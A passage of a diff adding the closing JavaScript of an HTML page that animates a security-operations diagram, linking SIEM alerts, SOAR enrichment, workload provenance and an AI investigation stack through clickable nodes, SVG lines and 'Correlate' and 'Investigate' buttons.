+  var matchToast = document.getElementById("matchToast");
+  var outcomePanel = document.getElementById("outcomePanel");
+  var findingsGrid = document.getElementById("findingsGrid");
+  var aiBracket = document.getElementById("aiBracket");
+  var bracketArrow = document.getElementById("bracketArrow");
+  var aiAgent = document.getElementById("aiAgent");
+  var aiContext = document.getElementById("aiContext");
+  var aiLearning = document.getElementById("aiLearning");
+  var arrAgentCtx = document.getElementById("arrAgentCtx");
+  var arrCtxLearn = document.getElementById("arrCtxLearn");
+
+  document.querySelectorAll("[data-node]").forEach(function (el) {
+    el.addEventListener("click", function () { showDetail(el.getAttribute("data-node")); });
+    el.addEventListener("keydown", function (e) {
+      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); showDetail(el.getAttribute("data-node")); }
+    });
+  });
+
+  var MAIN_CHAIN = ["siem", "alert", "soar-trigger", "soar-enrichment", "workload", "provenance"];
+
+  function drawSvgLines() {
+    var svg = document.getElementById("diagramSvg");
+    var card = document.getElementById("diagramCard");
+    if (!svg || !card || window.innerWidth < 900) { if (svg) svg.innerHTML = ""; return; }
+
+    var cr = card.getBoundingClientRect();
+    function center(el) {
+      var r = el.getBoundingClientRect();
+      return { x: r.left + r.width / 2 - cr.left, y: r.top + r.height / 2 - cr.top };
+    }
+
+    var logs = document.querySelectorAll(".log-stack .oval");
+    var siem = document.querySelector('[data-node="siem"]');
+    var prov = document.querySelector('[data-node="provenance"]');
+    var provItems = document.querySelectorAll(".prov-stack .oval");
+    var cs = center(siem);
+
+    var paths = [];
+    logs.forEach(function (log) {
+      var cl = center(log);
+      paths.push('<line class="ln-logs" x1="' + cl.x + '" y1="' + cl.y + '" x2="' + cs.x + '" y2="' + cs.y + '"/>');
+    });
+
+    for (var i = 0; i < MAIN_CHAIN.length - 1; i++) {
+      var a = document.querySelector('[data-node="' + MAIN_CHAIN[i] + '"]');
+      var b = document.querySelector('[data-node="' + MAIN_CHAIN[i + 1] + '"]');
+      if (a && b) {
+        var ca = center(a);
+        var cb = center(b);
+        paths.push('<line class="ln-main" x1="' + ca.x + '" y1="' + ca.y + '" x2="' + cb.x + '" y2="' + cb.y + '"/>');
+      }
+    }
+
+    var cp = center(prov);
+    provItems.forEach(function (item) {
+      var ci = center(item);
+      paths.push('<line class="ln-prov" x1="' + cp.x + '" y1="' + cp.y + '" x2="' + ci.x + '" y2="' + ci.y + '"/>');
+    });
+
+    var bracket = document.getElementById("aiBracket");
+    var agent = document.getElementById("aiAgent");
+    if (bracket && agent) {
+      var br = bracket.getBoundingClientRect();
+      var ag = center(agent);
+      var midX = cr.width / 2;
+      paths.push('<line class="ln-ai" x1="' + midX + '" y1="' + (br.bottom - cr.top) + '" x2="' + ag.x + '" y2="' + ag.y + '"/>');
+    }
+
+    svg.innerHTML = paths.join("");
+  }
+
+  function litArrows(on) {
+    document.querySelectorAll(".flow-arrow").forEach(function (a) { a.classList.toggle("lit", on); });
+    document.querySelectorAll(".diagram-svg line.ln-main, .diagram-svg line.ln-prov").forEach(function (l) {
+      l.classList.toggle("lit", on);
+    });
+  }
+
+  function litWorkloadPath(on) {
+    ["alert", "soar-trigger", "soar-enrichment", "workload", "provenance", "build", "deployment"].forEach(function (id) {
+      var el = document.querySelector('[data-node="' + id + '"]');
+      if (el) el.classList.toggle("lit", on);
+    });
+    litArrows(on);
+  }
+
+  btnCorrelate.addEventListener("click", function () {
+    if (correlated) return;
+    correlated = true;
+    btnCorrelate.disabled = true;
+    btnCorrelate.textContent = "✓ Correlation Complete";
+    litWorkloadPath(true);
+    matchToast.classList.add("visible");
+    showDetail("soar-enrichment");
+    btnInvestigate.disabled = false;
+  });
+
+  function animateAiStack() {
+    aiBracket.classList.add("lit");
+    bracketArrow.classList.add("lit");
+    aiAgent.classList.add("lit");
+    setTimeout(function () {
+      arrAgentCtx.classList.add("lit");
+      aiContext.classList.add("lit");
+    }, 400);
+    setTimeout(function () {
+      arrCtxLearn.classList.add("lit");
+      aiLearning.classList.add("lit");
+    }, 900);
+    document.querySelectorAll(".diagram-svg .ln-ai").forEach(function (l) { l.classList.add("lit-ai"); });
+  }
+
+  btnInvestigate.addEventListener("click", function () {
+    if (!correlated || investigated) return;
+    investigated = true;
+    btnInvestigate.disabled = true;
+    btnInvestigate.textContent = "✓ Investigation Complete";
+    animateAiStack();
+    showDetail("context");
+
+    findingsGrid.innerHTML = "";
+    FINDINGS.forEach(function (text, i) {
+      var card = document.createElement("div");
+      card.className = "finding-card";
+      card.innerHTML = '<div class="num">Finding ' + (i + 1) + "</div>" + text;
+      findingsGrid.appendChild(card);
+      setTimeout(function () { card.classList.add("visible"); }, 100 * i);
+    });
+    outcomePanel.classList.add("visible");
+  });
+
+  window.addEventListener("resize", drawSvgLines);
+  setTimeout(drawSvgLines, 100);
+  showDetail("workload");
+})();
+</script>
+</body>
+</html>
